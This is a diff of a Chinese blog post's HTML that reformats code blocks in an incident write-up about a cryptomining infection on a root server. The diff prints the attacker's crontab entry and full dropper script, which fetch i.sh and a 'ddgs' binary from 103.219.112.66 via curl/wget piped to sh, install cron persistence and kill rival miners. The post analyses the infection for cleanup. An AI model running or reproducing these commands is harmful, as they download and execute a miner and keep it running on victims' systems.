@@ -188,19 +188,47 @@ ga('send', 'pageview');
 <li><p>因为当时登录的是 <strong>root</strong> 用户, 所以用 <code>crontab -l</code> 查看了定时任务, 果真有这定时任务, 大喜 ! 执行命令得出的结果好像是这样的 :  </p>
 </li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/15 * * * * (/usr/bin/sequfa4||/usr/libexec/sequfa4||/usr/local/bin/sequfa4||/tmp/sequfa4||curl -fsSL -m180  http://103.219.112.66:8000/i.sh||wget -q -T180 -O- http://103.219.112.66:8000/i.sh) | sh</span><br></pre></td></tr></table></figure>
-
-
+<pre><code class="shell">    */15 * * * * (/usr/bin/sequfa4||/usr/libexec/sequfa4||/usr/local/bin/sequfa4||/tmp/sequfa4||curl -fsSL -m180  http://103.219.112.66:8000/i.sh||wget -q -T180 -O- http://103.219.112.66:8000/i.sh) | sh</code></pre>
 <ul>
 <li>接着顺腾摸瓜, 从定时任务里拿curl 那个命令去下载 i.sh 这个文件, 得到下面的内容的文件:  </li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin</span><br><span class="line"></span><br><span class="line">mkdir -p /var/spool/cron/crontabs</span><br><span class="line">echo "" &gt; /var/spool/cron/root</span><br><span class="line">echo "*/15 * * * * (/usr/bin/sequfa4||/usr/libexec/sequfa4||/usr/local/bin/sequfa4||/tmp/sequfa4||curl -fsSL -m180  http://103.219.112.66:8000/i.sh||wget -q -T180 -O- http://103.219.112.66:8000/i.sh) | sh" &gt;&gt; /var/spool/cron/root</span><br><span class="line">cp -f /var/spool/cron/root /var/spool/cron/crontabs/root</span><br><span class="line"></span><br><span class="line">cd /tmp</span><br><span class="line">touch /usr/local/bin/writeable &amp;&amp; cd /usr/local/bin/</span><br><span class="line">touch /usr/libexec/writeable &amp;&amp; cd /usr/libexec/</span><br><span class="line">touch /usr/bin/writeable &amp;&amp; cd /usr/bin/</span><br><span class="line">rm -rf /usr/local/bin/writeable /usr/libexec/writeable /usr/bin/writeable</span><br><span class="line"></span><br><span class="line">export PATH=$PATH:$(pwd)</span><br><span class="line">ps auxf | grep -v grep | grep sequfa4 || rm -rf sequfa4</span><br><span class="line">if [ ! -f "sequfa4" ]; then</span><br><span class="line">    curl -fsSL -m1800 http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -o sequfa4||wget -q -T1800  http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -O sequfa4</span><br><span class="line">fi</span><br><span class="line">chmod +x sequfa4</span><br><span class="line">/usr/bin/sequfa4||/usr/libexec/sequfa4||/usr/local/bin/sequfa4||/tmp/sequfa4</span><br><span class="line"></span><br><span class="line">ps auxf | grep -v grep | grep sequbcb | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequbcc | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequbcd | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequbce | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequfa0 | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequfa1 | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequfa2 | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequfa3 | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line"></span><br><span class="line">echo "*/15 * * * * (/usr/bin/sequfa4||/usr/libexec/sequfa4||/usr/local/bin/sequfa4||/tmp/sequfa4||curl -m180 -fsSL  http://103.219.112.66:8000/i.sh||wget -q -T180 -O- http://103.219.112.66:8000/i.sh) | sh" | crontab -</span><br></pre></td></tr></table></figure>
+<pre><code class="shell">export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin
 
+mkdir -p /var/spool/cron/crontabs
+echo &quot;&quot; &gt; /var/spool/cron/root
+echo &quot;*/15 * * * * (/usr/bin/sequfa4||/usr/libexec/sequfa4||/usr/local/bin/sequfa4||/tmp/sequfa4||curl -fsSL -m180  http://103.219.112.66:8000/i.sh||wget -q -T180 -O- http://103.219.112.66:8000/i.sh) | sh&quot; &gt;&gt; /var/spool/cron/root
+cp -f /var/spool/cron/root /var/spool/cron/crontabs/root
+
+cd /tmp
+touch /usr/local/bin/writeable &amp;&amp; cd /usr/local/bin/
+touch /usr/libexec/writeable &amp;&amp; cd /usr/libexec/
+touch /usr/bin/writeable &amp;&amp; cd /usr/bin/
+rm -rf /usr/local/bin/writeable /usr/libexec/writeable /usr/bin/writeable
+
+export PATH=$PATH:$(pwd)
+ps auxf | grep -v grep | grep sequfa4 || rm -rf sequfa4
+if [ ! -f &quot;sequfa4&quot; ]; then
+    curl -fsSL -m1800 http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -o sequfa4||wget -q -T1800  http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -O sequfa4
+fi
+chmod +x sequfa4
+/usr/bin/sequfa4||/usr/libexec/sequfa4||/usr/local/bin/sequfa4||/tmp/sequfa4
+
+ps auxf | grep -v grep | grep sequbcb | awk &#39;{print $2}&#39; | xargs kill -9
+ps auxf | grep -v grep | grep sequbcc | awk &#39;{print $2}&#39; | xargs kill -9
+ps auxf | grep -v grep | grep sequbcd | awk &#39;{print $2}&#39; | xargs kill -9
+ps auxf | grep -v grep | grep sequbce | awk &#39;{print $2}&#39; | xargs kill -9
+ps auxf | grep -v grep | grep sequfa0 | awk &#39;{print $2}&#39; | xargs kill -9
+ps auxf | grep -v grep | grep sequfa1 | awk &#39;{print $2}&#39; | xargs kill -9
+ps auxf | grep -v grep | grep sequfa2 | awk &#39;{print $2}&#39; | xargs kill -9
+ps auxf | grep -v grep | grep sequfa3 | awk &#39;{print $2}&#39; | xargs kill -9
+
+echo &quot;*/15 * * * * (/usr/bin/sequfa4||/usr/libexec/sequfa4||/usr/local/bin/sequfa4||/tmp/sequfa4||curl -m180 -fsSL  http://103.219.112.66:8000/i.sh||wget -q -T180 -O- http://103.219.112.66:8000/i.sh) | sh&quot; | crontab -</code></pre>
 <ul>
 <li>分析这个文件可以知道, 该脚本在机子上运行了一个叫做 <strong>sequfa4</strong>, 拿到百度一搜这个名字, 嗯 ? 没啥结果 ? 接着仔细看完才晓得, 其实是在这一串代码中下载了一个本机架构的 <strong>ddgs</strong> 的文件 !  </li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if [ ! -f "sequfa4" ]; then</span><br><span class="line">    curl -fsSL -m1800 http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -o sequfa4||wget -q -T1800  http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -O sequfa4</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">if [ ! -f &quot;sequfa4&quot; ]; then
+    curl -fsSL -m1800 http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -o sequfa4||wget -q -T1800  http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -O sequfa4
+fi</code></pre>
 <ul>
 <li>搜索引擎一搜, 哦豁, 果真是挖矿脚本, 不过好在脚本所做的时候都已经知道了, 只要把此脚本做的事逆向回去就好了. </li>
 </ul>
